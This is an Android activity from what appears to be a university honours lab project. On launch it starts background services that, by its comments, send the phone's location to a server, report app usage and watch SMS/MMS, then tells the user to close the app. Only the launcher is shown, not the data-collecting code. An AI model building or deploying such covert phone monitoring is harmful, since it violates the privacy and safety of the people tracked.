package uk.ac.rgu.lab04.honours;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;


public class MainActivity extends AppCompatActivity {

    private TextView msgDisplayed = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        msgDisplayed = findViewById(R.id.destroyApp);

        //checking permissions and grant them
        //checkingPermissions();

        //service sending location to server
        startLocationService();

        //service sending app usage stats
        startUsageStats();

        //service for sms
        startSMSService();


        msgDisplayed.setText("The app is set up, You can close it !");

    }

    @Override
    public void onBackPressed() {
        finishAffinity();
    }


    /***************************
    **                        **
    **  SMS OBSERVER SERVICE  **
    **                        **
    ***************************/
    private void startSMSService() {
        Intent intent = new Intent(this, ListenSmsMmsService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        }
    }

    /***************************
    **                        **
    **  USAGE STATS SERVICE   **
    **                        **
    ***************************/
    private void startUsageStats() {
        Intent intent = new Intent(this,UsageStatService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent);
        }
    }


    /***************************
    **                        **
    **    LOCATION SERVICE    **
    **                        **
    ***************************/
    public void startLocationService(){
        Intent intent = new Intent(this,LocationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        }
    }

    /***************************
    **                        **
    **  GRANTING PERMISSIONS  **
    **                        **
    ***************************/

}
